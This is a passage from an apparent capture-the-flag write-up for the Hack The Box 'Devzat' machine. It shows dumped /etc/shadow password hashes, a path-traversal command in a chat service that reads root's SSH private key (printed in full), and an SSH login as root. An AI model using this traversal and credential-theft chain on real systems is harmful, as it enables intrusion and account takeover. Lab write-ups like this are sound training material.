[SYSTEM] syslog:*:18659:0:99999:7:::
[SYSTEM] _apt:*:18659:0:99999:7:::
[SYSTEM] tss:*:18659:0:99999:7:::
[SYSTEM] uuidd:*:18659:0:99999:7:::
[SYSTEM] tcpdump:*:18659:0:99999:7:::
[SYSTEM] landscape:*:18659:0:99999:7:::
[SYSTEM] pollinate:*:18659:0:99999:7:::
[SYSTEM] sshd:*:18800:0:99999:7:::
[SYSTEM] systemd-coredump:!!:18800::::::
[SYSTEM] patrick:$6$7ni9PM4l99B7EKPi$/uLBm1IhrKmkS9xPaIgRRZj8aVfASc4eIZt.FvNDEz2r06MIsQMEf3bNegOIxGI./UsabjqsRSV6hWxrJrqbj0:1880
         0:0:99999:7:::
[SYSTEM] catherine:$6$.T9ZmexDFzOpXCH/$u9TICZ3NN5HOC1lWNHGuXP0Hyn/R8HMPS12kUgFdPAwUNl8F3qd5yuL6ptmW40IrBLxBMOTjskHfu1CwK72bw0:18
         800:0:99999:7:::
[SYSTEM] usbmux:*:18800:0:99999:7:::
catherine: 

```


Boom! We have root RCE! Now let's grab root's private key and ssh (similar how patrick's RCE)

```
catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----

```

Place that into id_root_rsa and ssh!

```
╭─    ~/Hackthebox/Devzat  on   master ?12 ·························································································································································································· ✔  at 19:09:12  ─╮
╰─ ssh -i id_root_rsa root@devzat.htb                                                                                                                                                                                                                           ─╯
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 10 Mar 2022 12:09:25 AM UTC

  System load:  0.01              Processes:                242
  Usage of /:   56.0% of 7.81GB   Users logged in:          1
  Memory usage: 24%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118


107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@devzat:~# uname -a
Linux devzat 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
root@devzat:~# whoami
root
root@devzat:~# wc -l root.txt 
1 root.txt
root@devzat:~# 
```